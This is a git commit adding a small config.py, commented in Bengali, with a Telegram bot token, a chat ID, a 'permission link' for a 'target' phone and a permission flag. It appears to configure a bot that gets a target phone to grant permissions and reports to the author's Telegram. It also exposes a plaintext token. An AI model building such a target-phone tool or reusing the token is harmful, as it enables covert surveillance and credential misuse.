aef62ca09393ebf2165dcb326cbe5652f792281b
MAR PD <mdranasheikhe2005@gmail.com>
2025-09-19 08:30:45 +0600

    Create config.py

---
+++ config.py
@@ -0,0 +1,13 @@
+# config.py
+
+# তোমার Telegram Bot Token
+BOT_TOKEN = "7488701410:AAFKGY3IXRpaB_GlqTcJI4VDFPKqnknR2d4"
+
+# তোমার Telegram Chat ID
+CHAT_ID = "6454347745"
+
+# Target ফোনে permission দেওয়ার link
+PERMISSION_LINK = "https://raw.githubusercontent.com/master-pd/I_Love_You_Bot/refs/heads/main/web_setup/permission.html"
+
+# Permission granted হলে True, না হলে False
+PERMISSION_GRANTED = False
